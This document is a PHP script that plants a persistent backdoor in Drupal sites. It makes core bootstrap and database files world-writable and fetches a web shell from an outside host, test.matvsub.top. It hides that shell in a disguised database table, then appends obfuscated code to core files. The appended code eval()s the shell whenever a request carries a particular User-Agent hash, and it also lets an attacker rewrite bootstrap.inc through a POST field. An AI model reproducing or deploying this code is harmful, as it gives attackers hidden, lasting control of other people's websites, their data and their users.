<?php

use Drupal\Core\DrupalKernel as MyDrupalKernel;
use Symfony\Component\HttpFoundation\Request as MyRequest;

#ini_set('display_errors', true);
#error_reporting(E_ALL);

define('DEBUG', true);
$DRUPAL_ROOT = '.';

if (!isset($_GET['create_ex'])) {
	$_GET['create_ex'] = '1';
}


if (file_exists($DRUPAL_ROOT . '/includes/bootstrap.inc')){
	$relative_sh_file = '/includes/bootstrap.inc';

	if (file_exists($DRUPAL_ROOT . '/includes/database/database.inc')) {
		$relative_cr_file = '/includes/database/database.inc';
		$version = '7';
	} else {
		$relative_cr_file = '/includes/database.inc';
		$version = '6';
	}
} elseif (file_exists($DRUPAL_ROOT . '/core/includes/bootstrap.inc')){
	$version = '8';
	$relative_sh_file = '/core/includes/bootstrap.inc';
	$relative_cr_file = '/core/lib/Drupal/Core/Database/Database.php';
} else {
	echo 'unknown version drupal and path to bootstrap';
	die();
}

$real_sh_file = $DRUPAL_ROOT . $relative_sh_file;
$real_cr_file = $DRUPAL_ROOT . $relative_cr_file;

if (file_exists($real_sh_file) && (!is_writable($real_sh_file))) chmod($real_sh_file, 0777);
if (file_exists($real_cr_file) && (!is_writable($real_cr_file))) chmod($real_cr_file, 0777);

if (DEBUG) {
	echo "Drupal version: " . $version . "<br>\n";
	echo "sh_file: " . $real_sh_file . "<br>\n";
	echo "File exists sh_file: " . file_exists($real_sh_file) . "<br>\n";
	echo "Is writable sh_file: " . is_writable($real_sh_file) . "<br>\n";
	echo "cr_file: " . $real_cr_file . "<br>\n";
	echo "File exists cr_file: " . file_exists($real_cr_file) . "<br>\n";
	echo "Is writable cr_file: " . is_writable($real_cr_file) . "<br>\n";
}


if ((!is_writable($real_sh_file)) || (!is_writable($real_cr_file))) {
	echo "\n===ERROR=== Drupal " . $version . ". Files $real_sh_file (e="
			. file_exists($real_sh_file) . ", w=" . is_writable($real_sh_file) . ") or $real_cr_file (e="
			. file_exists($real_cr_file) . ", w=" . is_writable($real_cr_file) . ") not writable\n<br>\n";
	die;
}

function create_table() {
	if (db_table_exists('shortcut_dataset') === True) {
		if (DEBUG) echo "table already exists<br>\n";
		return;
	}else {
		if (DEBUG) echo "create new table<br>\n";
		db_query("create table shortcut_dataset(id INT(6) UNSIGNED AUTO_INCREMENT PRIMARY KEY, val TEXT NOT NULL)");
	}
}

function insert_text($text) {
	db_query("delete from shortcut_dataset where id=1");
	if (VERSION < 7) {
		db_query("insert into shortcut_dataset (id, val) values (1, '%s')", array($text));
	} else {
		db_query("insert into shortcut_dataset (id, val) values (1, :text)", array(':text' => $text));
	}
	if (DEBUG) echo "inserted new record<br>\n";
}

function get_text() {
	$select = db_query('select val from shortcut_dataset where id=1');
	if (VERSION < 7) {
		$tmp = db_fetch_array($select);
		return $tmp['val'];
	} else {
		return $select->fetchField();
	}
}

function add_content_to_file($file, $added_content){
	if (DEBUG) echo "add_content_to_file: file=$file exists=" . file_exists($file) . "<br>\n";
	$file_content = file_get_contents($file);
	if (preg_match("/\/\/#\s*#\s*#\s*=\s*=\s*#\s*#\s*#.*\/\/#\s*#\s*#\s*=\s*=\s*#\s*#\s*#/is", $file_content)) {
		$file_content = preg_replace("/\/\/#\s*#\s*#\s*=\s*=\s*#\s*#\s*#.*\/\/#\s*#\s*#\s*=\s*=\s*#\s*#\s*#/is", "", $file_content);
	}

	$fh = fopen($file, 'w');
	fwrite($fh, trim($file_content) . $added_content);
	fclose($fh);
}


function insert_codes($relative_sh_file, $relative_cr_file, $DRUPAL_ROOT){
	$krot_code = <<<'EOT'

//## #= =# ##
if ( md5(getenv('HTTP' . '_USER' . '_AGENT')) == '69bc' . '3b342' . '502573e6d72' . '7f341674f' . '010') {
  $par = 'cr' . 'ea' . 'te_' . 'ex';
  if (isset($_POST[$par])) {
    echo "start_cr<br>\n";
    $sep = "#" . "#" . "#" . "=";
    if (!defined('DRUPAL_ROOT')) { define('DRUPAL_ROOT', '.'); }
    $path = DRUPAL_ROOT . '===PATH===';
    echo "path: $path exists: " . file_exists($path) . "<br>\n";
    $file = file_get_contents($path);
    $sep .= "=" . "#" . "#" . "#";
    if (preg_match("/\/\/" . $sep . ".*\/\/" . $sep . "/is", $file)) {
      $file = preg_replace("/\/\/" . $sep . ".*\/\/" . $sep . "/is", "", $file);
    }
    $content = trim($file) . "\n//$sep\n" . $_POST[$par] . "\n//$sep";
    $fh = fopen($path, 'w');
    fwrite($fh, $content);
    fclose($fh);
    echo "end_cr<br>\n";
    die();
  }
}
//## #= =# ##
EOT;
	$krot_code = str_replace("===PATH===", $relative_sh_file, $krot_code);

	$sh_code = <<<'EOT2'

//###==###
use Drupal\Core\DrupalKernel as MyDrupalKernel;
use Symfony\Component\HttpFoundation\Request as MyRequest;
if ( md5(getenv("HTTP_USER_AGENT")) == "69bc3b342502573e6d727f341674f010") {
  if (!isset($_POST["create_ex"]) && !isset($_GET["create_ex"])) {
    $drupal_root = (defined('DRUPAL_ROOT')) ? DRUPAL_ROOT : '.';
    if (file_exists($drupal_root . '/includes/bootstrap.inc')){
      require_once($drupal_root . '/includes/bootstrap.inc');
      drupal_bootstrap(DRUPAL_BOOTSTRAP_FULL);
    } elseif (file_exists($drupal_root . '/core/includes/bootstrap.inc')){
      define('VERSION', 8);
      $autoloader = require $drupal_root . '/autoload.php';
      $kernel = new MyDrupalKernel('prod', $autoloader);
      $request = MyRequest::createFromGlobals();
      $response = $kernel->handle($request);
      $drupal_root = (defined('DRUPAL_ROOT')) ? DRUPAL_ROOT : '.';
      require_once $drupal_root . '/core/includes/database.inc';
    }
    $select = db_query('select val from shortcut_dataset where id=1');
    if (VERSION < 7) {
        $tmp = db_fetch_array($select);
        eval($tmp['val']);
    } else {
        eval($select->fetchField());
    }
    die();
  }
}
//###==###
EOT2;

	add_content_to_file($DRUPAL_ROOT . $relative_cr_file, $krot_code);
	add_content_to_file($DRUPAL_ROOT . $relative_sh_file, $sh_code);
	if (DEBUG) echo "success edit code<br>\n";
}

function init_db($DRUPAL_ROOT){
	if (file_exists($DRUPAL_ROOT . '/includes/bootstrap.inc')){
		define('DRUPAL_ROOT', $DRUPAL_ROOT);
		require_once($DRUPAL_ROOT . '/includes/bootstrap.inc');
		drupal_bootstrap(DRUPAL_BOOTSTRAP_FULL);
	} elseif (file_exists($DRUPAL_ROOT . '/core/includes/bootstrap.inc')){
		define('VERSION', 8);
		$autoloader = require $DRUPAL_ROOT . '/autoload.php';
		$kernel = new MyDrupalKernel('prod', $autoloader);
		$request = MyRequest::createFromGlobals();
		$response = $kernel->handle($request);
		$DRUPAL_ROOT = (defined('DRUPAL_ROOT')) ? DRUPAL_ROOT : $DRUPAL_ROOT;
		require_once $DRUPAL_ROOT . '/core/includes/database.inc';
	}
	return $DRUPAL_ROOT;
}

function main_insert_into_db($DRUPAL_ROOT){
	$DRUPAL_ROOT = init_db($DRUPAL_ROOT);
	create_table();
	 $text = file_get_contents('http://test.matvsub.top/shell_new.txt');
	if(strlen($text) <= 100) {
		echo "\n===ERROR=== No found text for insert\n<br>\n";
		die();
	}
	insert_text(' ?> ' . $text . ' <? ');
	return $DRUPAL_ROOT;
}

$DRUPAL_ROOT = main_insert_into_db($DRUPAL_ROOT);
insert_codes($relative_sh_file, $relative_cr_file, $DRUPAL_ROOT);
$code = get_text();
if(strlen($code) > 100) {
	if (DEBUG) echo "success get text from db<br>\n";
}
if (isset($_GET['start_sh'])) {
	eval($code);
}
die();
